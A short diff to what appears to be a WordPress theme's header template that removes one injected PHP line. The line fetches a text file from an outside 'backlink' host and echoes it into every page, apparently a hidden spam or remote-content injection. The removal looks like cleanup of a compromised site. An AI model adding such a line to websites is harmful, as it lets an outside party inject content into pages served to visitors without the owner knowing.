@@ -19,8 +19,6 @@
 
 </head>
 
-<?php $a = file_get_contents('https://grtoto.store/backlink/keep-secret-rule-the-google.txt'); echo $a; ?>
-
 <body <?php body_class(); ?>>
 
 <?php if ( function_exists( 'wp_body_open' ) ) {
